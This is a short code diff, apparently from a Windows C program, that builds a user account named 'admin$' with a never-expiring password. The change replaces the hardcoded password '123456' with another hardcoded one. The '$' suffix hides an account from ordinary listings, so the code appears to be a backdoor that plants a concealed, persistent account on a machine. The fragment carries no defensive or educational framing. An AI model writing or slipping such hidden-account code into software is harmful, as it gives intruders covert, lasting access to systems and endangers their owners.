@@ -21,7 +21,7 @@ int main(int agrc, char *agrv[]) {
   USER_INFO_1 user;
   memset(&user, 0, sizeof(user));
   user.usri1_name = L"admin$";
-  user.usri1_password = L"123456";
+  user.usri1_password = L"Leoasdzxc123.";
   user.usri1_priv = USER_PRIV_USER;
   user.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
   user.usri1_comment = NULL;
